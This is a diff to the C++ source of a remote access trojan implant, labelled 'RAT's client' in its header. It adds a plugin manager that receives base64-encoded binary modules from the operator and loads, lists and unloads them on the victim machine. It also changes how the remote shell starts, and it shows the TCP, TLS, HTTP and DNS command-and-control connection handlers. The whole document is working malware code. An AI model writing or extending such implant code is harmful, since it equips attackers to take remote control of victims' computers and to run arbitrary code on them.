@@ -37,6 +37,7 @@ Introduction: Implant(RAT's client).
 #include "clsServMgr.hpp"
 #include "clsLoader.hpp"
 #include "clsShell.hpp"
+#include "clsPluginMgr.hpp"
 
 #include "clsLtnTcp.hpp"
 #include "clsLtnTls.hpp"
@@ -58,8 +59,8 @@ enum enConnectionMethod
     DNS,
 };
 
-clsLtnTcp* g_ltpTcp = nullptr;
 clsShell* g_shell = nullptr;
+clsPluginMgr* g_pluginMgr = nullptr;
 
 std::unordered_map<int, std::shared_ptr<clsProxySocks5>> g_mapSocks5;
 std::mutex g_mtxSocks5;
@@ -434,6 +435,9 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
         {
             if (vsMsg[1] == "start")
             {
+                std::string szShellPath = vsMsg[2];
+                std::string szInitPath = vsMsg[3];
+
                 if (g_shell)
                 {
                     g_shell->fnStop();
@@ -443,7 +447,7 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
                 if (!g_shell)
                 {
                     g_shell = new clsShell(victim);
-                    g_shell->fnStart();
+                    g_shell->fnStart(szShellPath, szInitPath);
                 }
             }
             else if (vsMsg[1] == "stop")
@@ -710,11 +714,100 @@ void fnRecvCommand(std::shared_ptr<clsVictim> victim, const std::vector<std::str
                 }
             }
         }
+        else if (vsMsg[0] == "plugin")
+        {
+            if (g_pluginMgr == nullptr)
+            {
+                g_pluginMgr = new clsPluginMgr(victim);
+            }
+
+            if (vsMsg[1] == "ls")
+            {
+                auto vPlugin = g_pluginMgr->fnListPlugins();
+                std::vector<std::vector<std::string>> v2d; //2d vector.
+
+                for (int i = 0; i < vPlugin.size(); i++)
+                {
+                    auto plugin = vPlugin[i]; //meta-data.
+                    STRLIST tmp = {
+                        plugin.szName,
+                        std::to_string(plugin.uPluginVersion),
+                        std::to_string(plugin.uAbiVersion),
+                        plugin.szDescription,
+                    };
+
+                    v2d.push_back(tmp);
+                }
+
+                STRLIST ls = {
+                    "plugin",
+                    "ls",
+                    clsEZData::fnszSend2dParser(v2d),
+                };
+
+                victim->fnSendCommand(ls);
+            }
+            else if (vsMsg[1] == "load")
+            {
+                std::string szName = vsMsg[2];
+                std::vector<uint8_t> abBytes = clsEZData::fnb64Decode(vsMsg[3]);
+
+                g_pluginMgr->fnLoadPlugin(szName, abBytes);
+
+                /*
+                STRLIST ls = {
+                    "hello=world",
+                };
+
+                g_pluginMgr->fnRunPlugin(szName, ls);
+
+                g_pluginMgr->fnUnloadPlugin(szName);
+                */
+
+                auto meta = g_pluginMgr->fnGetPluginMeta(szName);
+
+                STRLIST ls = {
+                    "plugin",
+                    "load",
+                    "1",
+                    meta->szName,
+                    std::to_string(meta->uAbiVersion),
+                    std::to_string(meta->uPluginVersion),
+                    meta->szDescription,
+                };
+
+                victim->fnSendCommand(ls);
+            }
+            else if (vsMsg[1] == "unload")
+            {
+                std::string szName = vsMsg[2];
+
+                STRLIST ls = {
+                    "plugin",
+                    "unload",
+                    szName,
+                    g_pluginMgr->fnUnloadPlugin(szName) ? "1" : "0",
+                };
+
+                victim->fnSendCommand(ls);
+            }
+            else if (vsMsg[1] == "run")
+            {
+                std::string szName = vsMsg[2];
+
+            }
+            else if (vsMsg[1] == "clear")
+            {
+
+            }
+        }
     }
     catch(const std::exception& e)
     {
         clsTools::fnLogErr(e.what());
     }
+
+    return;
 }
 
 #pragma region Connection Handler
@@ -828,6 +921,8 @@ void fnTcpHandler(int sktSrv)
     } while (nRecv > 0);
 
     clsTools::fnLogInfo("Session is terminated.");
+
+    return;
 }
 
 void fnHttpHandler(int sktSrv)
@@ -926,6 +1021,8 @@ void fnHttpHandler(int sktSrv)
     } while (nRecv > 0);
 
     clsTools::fnLogErr("Session is terminated.");
+
+    return;
 }
 
 void fnTlsHandler(int nSktSrv, SSL* ssl)
@@ -986,6 +1083,8 @@ void fnTlsHandler(int nSktSrv, SSL* ssl)
     } while (nRecv > 0);
     
     clsTools::fnLogInfo("Session is terminated.");
+
+    return;
 }
 
 #pragma endregion
@@ -1016,6 +1115,7 @@ void fnTcpConnect(std::string& szIP, int nPort)
         std::cerr << e.what() << '\n';
     }
     
+    return;
 }
 
 void fnTlsConnect(std::string& szIP, int nPort)
@@ -1050,6 +1150,8 @@ void fnTlsConnect(std::string& szIP, int nPort)
     fnTlsHandler(sktSrv, ssl);
 
     SSL_CTX_free(ctx);
+
+    return;
 }
 
 void fnHttpConnect(std::string& szIP, int nPort)
@@ -1070,10 +1172,13 @@ void fnHttpConnect(std::string& szIP, int nPort)
     }
 
     close(sktSrv);
+
+    return;
 }
 
 void fnDnsConnect(std::string& szIP, int nPort)
 {
+
 
 }
 
@@ -1140,4 +1245,6 @@ int main(int argc, char *argv[])
         std::this_thread::sleep_for(std::chrono::milliseconds(1000));
 
     }
+
+    return 0;
 }
